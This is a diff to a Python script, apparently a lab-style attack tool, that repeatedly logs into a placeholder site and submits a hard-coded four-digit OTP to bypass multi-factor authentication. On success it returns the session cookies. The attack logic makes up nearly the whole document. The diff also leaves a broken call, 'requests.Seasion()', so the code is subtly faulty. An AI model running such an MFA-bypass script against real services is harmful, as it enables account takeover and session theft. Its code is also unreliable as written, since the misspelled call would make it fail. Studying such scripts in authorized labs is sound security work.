@@ -4,7 +4,7 @@ import requests
 login_url="http://example.com"
 otp_url="http://example/mfa"
 dashboard_url="http://example/dashboard"
-hard_coded_opt=3333
+hard_coded_opt="3333"
 
 credentials={
     "username":"username123",
@@ -21,14 +21,14 @@ headers={
     'Content-Type': 'application/x-www-form-urlencoded',
     'Origin': 'http://example.com',
     'Connection': 'close',
-    'Referer': 'http://example/mfa',
+    'Referer': 'http://example.com/mfa',
     'Upgrade-Insecure-Requests': '1'
 }
 
 
 # Function for checking if log in has succeeded
 def is_loggedin_success(response):
-    return "User verfication" in response.text and response.status_code==200
+    return "User verification" in response.text and response.status_code==200
 
 # This function handles log in
 def handle_login(session):
@@ -37,14 +37,14 @@ def handle_login(session):
 
 
 # Function for handling mfa
-def test_top(session, otp):
+def test_otp(session, otp):
     otp_code={
         "code-1": otp[0],
         "code-2": otp[1],
         "code-3": otp[2],
         "code-4":otp[3]
     }
-    response = session.post(otp_url, data=opt_code, headers=headers, allow_redirects=false)
+    response = session.post(otp_url, data=otp_code, headers=headers, allow_redirects=False)
     print("OTP response code recieved", {response.status_code})
 
     return response
@@ -64,7 +64,7 @@ def check_login(response):
 def brute_force():
     while True:
 
-        session= request.Seasson()
+        session= requests.Seasion()
         login_response= handle_login(session)
 
         if is_loggedin_success(login_response):
@@ -72,7 +72,7 @@ def brute_force():
         else:
             continue
 
-        response= test_top(session, hard_coded_opt)
+        response=test_otp(session, hard_coded_opt)
 
         if check_login(response):
             print("Unsuccessful try, we got redirected to log in page")
@@ -82,10 +82,10 @@ def brute_force():
         if response.status_code == 302:
             current_location=response.headers.get('Location','')
             
-            if current_location == dashboard_url:
+            if current_location == "/dashboard":
                 print("Successfully bypassed OTP with: ", hard_coded_opt)
                 return session.cookies.get_dict()
-            elif current_location ==login_url:
+            elif current_location =="/":
                 print("Unseccessful attempt, redirected to log in page")
             else:
                 print("unknown header location: ", current_location , "OTP: ", hard_coded_opt)
